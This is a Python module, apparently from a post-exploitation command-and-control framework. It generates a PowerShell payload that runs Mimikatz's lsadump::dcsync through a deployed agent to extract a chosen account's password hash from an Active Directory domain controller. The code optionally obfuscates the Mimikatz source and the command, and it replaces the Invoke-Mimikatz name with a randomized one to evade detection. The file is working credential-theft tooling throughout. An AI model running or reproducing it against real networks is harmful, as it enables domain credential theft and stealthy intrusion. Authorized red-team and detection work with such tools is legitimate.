from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers
import threading

class Module(object):
    
    def __init__(self, mainMenu, params=[]):
        
        self.info = {
            'Name': 'Invoke-Mimikatz DCsync',
            
            'Author': ['@gentilkiwi', 'Vincent Le Toux', '@JosephBialek'],
            
            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to extract a given account password through "
                            "Mimikatz's lsadump::dcsync module. This doesn't "
                            "need code execution on a given DC, but needs to be "
                            "run from a user context with DA equivalent privileges."),

            'Software': 'S0002',

            'Techniques': ['T1098', 'T1003', 'T1081', 'T1207', 'T1075', 'T1097', 'T1145', 'T1101', 'T1178'],

            'Background': True,
            
            'OutputExtension': None,
            
            'NeedsAdmin': False,
            
            'OpsecSafe': True,
            
            'Language': 'powershell',
            
            'MinLanguageVersion': '2',
            
            'Comments': [
                'http://blog.gentilkiwi.com',
                'http://clymb3r.wordpress.com/'
            ]
        }
        
        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                'Description': 'Agent to run module on.',
                'Required': True,
                'Value': ''
            },
            'user': {
                'Description': r'Username to extract the hash for (domain\username format).',
                'Required': True,
                'Value': ''
            },
            'domain': {
                'Description': 'Specified (fqdn) domain to pull for the primary domain/DC.',
                'Required': False,
                'Value': ''
            },
            'dc': {
                'Description': 'Specified (fqdn) domain controller to pull replication data from.',
                'Required': False,
                'Value': ''
            }
        }
        
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # used to protect self.http and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    # this might not be necessary. Could probably be achieved by just callingg mainmenu.get_db but all the other files have
    # implemented it in place. Might be worthwhile to just make a database handling file -Hubbl3
    def get_db_connection(self):
        """
        Returns the cursor for SQLlite DB
        """
        self.lock.acquire()
        self.mainMenu.conn.row_factory = None
        self.lock.release()
        return self.mainMenu.conn

    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""
        
        moduleCode = f.read()
        f.close()
        
        script = moduleCode
        
        scriptEnd = "Invoke-Mimikatz -Command "
        
        scriptEnd += "'\"lsadump::dcsync /user:" + self.options['user']['Value']
        
        if self.options["domain"]['Value'] != "":
            scriptEnd += " /domain:" + self.options['domain']['Value']
        
        if self.options["dc"]['Value'] != "":
            scriptEnd += " /dc:" + self.options['dc']['Value']
        
        scriptEnd += "\"';"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd,
                                          obfuscationCommand=obfuscationCommand)
        script += scriptEnd

        # Get the random function name generated at install and patch the stager with the proper function name
        conn = self.get_db_connection()
        self.lock.acquire()
        cur = conn.cursor()
        cur.execute("SELECT Invoke_Mimikatz FROM functions")
        replacement = cur.fetchone()
        cur.close()
        self.lock.release()
        script = script.replace("Invoke-Mimikatz", replacement[0])

        return script
